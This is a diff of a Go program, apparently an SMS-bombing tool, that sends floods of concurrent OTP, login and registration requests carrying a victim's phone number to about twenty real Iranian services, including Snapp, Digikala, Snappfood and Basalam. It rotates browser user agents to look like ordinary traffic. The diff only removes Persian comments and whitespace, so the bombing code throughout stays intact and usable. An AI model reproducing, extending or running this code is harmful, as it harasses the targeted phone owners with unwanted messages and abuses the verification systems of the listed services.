@@ -16,7 +16,6 @@ import (
 	"sync"
 	"syscall"
 	"time"
-
 	"net/http/cookiejar"
 	"math/rand" 
 )
@@ -339,8 +338,6 @@ var userAgents = []string{
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Vivaldi/5.3.2679.70",
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 YaBrowser/23.2.0.0 Safari/537.36",
 }
-
-
 //Code by @monsmain
 func clearScreen() {
 	cmd := exec.Command("clear")
@@ -2063,198 +2060,198 @@ cookieJar, _ := cookiejar.New(nil)
 					"phone": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client)
 
-		// snapp.market(JSON) - ممکن است تکراری باشد
+		// snapp.market(JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() {
 			return func() {
-				sendJSONRequest(c, ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
 					"cellphone": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client)
 
 		// digikala.com (JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
-				sendJSONRequest(c, ctx, "https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, "https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{ 
 					"username": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client)
 
 		// ponisha.ir (JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() {
 			return func() {
-				sendJSONRequest(c, ctx, "https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, "https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
 					"mobile": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client)
 
 		// bitycle.com (JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
-				sendJSONRequest(c, ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
 					"phone": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client)
 
 		// barghman (JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() {
 			return func() {
-				sendJSONRequest(c, ctx, "https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, "https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{ 
 					"mobile": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client)
 
 		// komodaa.com (JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
-				sendJSONRequest(c, ctx, "https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, "https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{ 
 					"phone_number": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client)
 //number30-3✅
 		// anargift.com auth (JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
-				sendJSONRequest(c, ctx, "https://ssr.anargift.com/api/v1/auth", map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, "https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
 					"mobile": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client)
 
-		// anargift.com (JSON) - send_code
+		// anargift.com (JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() {
 			return func() {
-				sendJSONRequest(c, ctx, "https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, "https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{ 
 					"mobile": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client) 
 
-		// digitalsignup.snapp.ir (URL query) - ممکن است تکراری باشد
+		// digitalsignup.snapp.ir
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
-				sendJSONRequest(c, ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{ 
 					"cellphone": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client) 
 
-		// digitalsignup.snapp.ir (JSON) - ممکن است تکراری باشد
+		// digitalsignup.snapp.ir (JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() {
 			return func() {
-				sendJSONRequest(c, ctx, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
 					"cellphone": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client)
 
 		// Snappfood (Form)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
 				formData := url.Values{}
 				formData.Set("cellphone", phone)
-				sendFormRequest(c, ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch) // ارسال c
+				sendFormRequest(c, ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch) 
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client) 
 
 		// khodro45.com (JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
-				sendJSONRequest(c, ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{ 
 					"mobile":      phone,
 					"device_type": 2,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client) 
 
-		// irantic.com (JSON) - ممکن است تکراری باشد
+		// irantic.com (JSON) 
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() {
 			return func() {
-				sendJSONRequest(c, ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
 					"mobile": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client) 
 
 		// basalam.com (JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
-				sendJSONRequest(c, ctx, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{ 
 					"mobile": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client) 
 
 		// drnext.ir (JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
-				sendJSONRequest(c, ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{ 
 					"mobile": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client) 
 
-		// digikalajet.ir (JSON) - ممکن است تکراری باشد
+		// digikalajet.ir (JSON) 
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
-				sendJSONRequest(c, ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
 					"phone": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client) 
 
 		// caropex.com (JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() {
 			return func() {
-				sendJSONRequest(c, ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{ 
 					"mobile": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client)
 
 		// tetherland.com (JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
-				sendJSONRequest(c, ctx, "https://service.tetherland.com/api/v5/login-register", map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, "https://service.tetherland.com/api/v5/login-register", map[string]interface{}{
 					"mobile": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client) 
 
 		// tandori.ir (JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
-				sendJSONRequest(c, ctx, "https://api.tandori.ir/client/users/login", map[string]interface{}{ // ارسال c
+				sendJSONRequest(c, ctx, "https://api.tandori.ir/client/users/login", map[string]interface{}{ 
 					"phone": phone,
 				}, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client)
 //number13_1
 
 	}
